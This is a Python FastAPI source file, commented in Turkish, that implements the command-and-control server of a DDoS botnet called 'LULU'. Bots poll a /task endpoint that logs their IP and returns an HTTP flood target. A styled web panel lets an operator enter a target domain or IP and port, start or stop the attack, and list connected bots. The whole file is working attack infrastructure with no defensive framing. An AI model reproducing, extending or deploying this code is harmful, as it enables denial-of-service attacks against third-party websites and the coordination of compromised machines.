from fastapi import FastAPI, Request, Form
from fastapi.responses import HTMLResponse
from datetime import datetime
import uvicorn

app = FastAPI()

# Bot havuzu
bots = {}
ddos_target = ""
ddos_port = 80

# ==================== BOT TASK ENDPOINT (EN ÖNEMLİ KISIM) – LAYER7 UYUMLU ====================
@app.get("/task")
async def task(id: str, request: Request):
    client_ip = request.client.host
    
    # Botu kaydet / güncelle
    bots[id] = {
        "ip": client_ip,
        "last": datetime.now()
    }
    
    # YENİ LULU v2.1 BOT İÇİN ZORUNLU FORMAT
    # Örnek çıktı: HTTP|http://site.com|80|GET   veya   HTTP|https://site.com|443|GET
    if ddos_target != "":
        # Eğer kullanıcı http:// veya https:// yazmadıysa otomatik ekle
        target = ddos_target.strip()
        if not target.startswith("http://") and not target.startswith("https://"):
            target = "http://" + target
        
        return f"HTTP|{target}|{ddos_port}|GET"
    else:
        return "IDLE"
# ==================== PANEL ====================
@app.get("/panel", response_class=HTMLResponse)
async def panel():
    online = len(bots)
    botlist = "".join([f"<tr><td>{id}</td><td>{data['ip']}</td><td>{data['last'].strftime('%H:%M:%S')}</td></tr>"
                       for id, data in bots.items()])
    
    html_content = f"""
    <!DOCTYPE html>
    <html lang="tr">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>LULU C2 Panel</title>
        <style>
            body {{font-family: 'Courier New', monospace; background: #0d0d0d; color: #00ff00; margin:40px;}}
            h1 {{text-align:center; color:#00ff41; text-shadow: 0 0 10px #00ff41;}}
            .container {{max-width:900px; margin:auto; background:#111; padding:25px; border-radius:10px;
                        border:1px solid #00ff41; box-shadow:0 0 20px rgba(0,255,65,0.3);}}
            input, button {{padding:12px; margin:8px 0; width:100%; border-radius:5px;
                           border:1px solid #00ff41; background:#000; color:#00ff41; font-size:16px;}}
            button {{background:#003300; cursor:pointer; font-weight:bold; transition:0.3s;}}
            button:hover {{background:#006600; box-shadow:0 0 15px #00ff41;}}
            button.stop {{background:#330000;}}
            button.stop:hover {{background:#660000;}}
            table {{width:100%; border-collapse:collapse; margin-top:20px;}}
            th, td {{padding:12px; border:1px solid #00ff41; text-align:center;}}
            th {{background:#002200;}}
            .status {{font-size:26px; font-weight:bold; text-align:center; margin:25px 0;}}
        </style>
    </head>
    <body>
        <div class="container">
            <h1>LULU DDoS C2 PANEL</h1>
           
            <form method="post" action="/start">
                <label>Hedef IP / Domain:</label>
                <input type="text" name="ip" placeholder="örnek: 192.168.1.1 veya site.com" required>
                
                <label>Port:</label>
                <input type="number" name="port" value="80" min="1" max="65535" required>
                
                <button type="submit">DDoS BAŞLAT</button>
            </form>
            
            <form method="post" action="/stop">
                <button type="submit" class="stop">DDoS DURDUR</button>
            </form>
            
            <div class="status">
                Aktif Bot: <span style="color:#ff0066;">{online}</span> adet
            </div>
            
            <table>
                <thead>
                    <tr><th>Bot ID</th><th>IP Adresi</th><th>Son Bağlantı</th></tr>
                </thead>
                <tbody>
                    {botlist if botlist else "<tr><td colspan='3'>Henüz bot yok</td></tr>"}
                </tbody>
            </table>
            
            <br><center>© 2025 LULU Edgewalker C2</center>
        </div>
    </body>
    </html>
    """
    return HTMLResponse(content=html_content)

# ==================== SALDIRI KOMUTLARI ====================
@app.post("/start")
async def start(ip: str = Form(...), port: int = Form(...)):
    global ddos_target, ddos_port
    ddos_target = ip.strip()
    ddos_port = port
    return HTMLResponse(f"""
    <h1 style='color:#00ff41;text-align:center;margin-top:100px;'>
        DDoS BAŞLATILDI<br>
        Hedef → {ddos_target}:{ddos_port}
    </h1>
    <meta http-equiv='refresh' content='3;url=/panel'>
    """)

@app.post("/stop")
async def stop():
    global ddos_target, ddos_port
    ddos_target = ""
    ddos_port = 80
    return HTMLResponse("""
    <h1 style='color:#ff0066;text-align:center;margin-top:100px;'>
        DDoS DURDURULDU
    </h1>
    <meta http-equiv='refresh' content='3;url=/panel'>
    """)

# ==================== BAŞLAT ====================
if __name__ == "__main__":
    uvicorn.run(app, host="0.0.0.0", port=8000)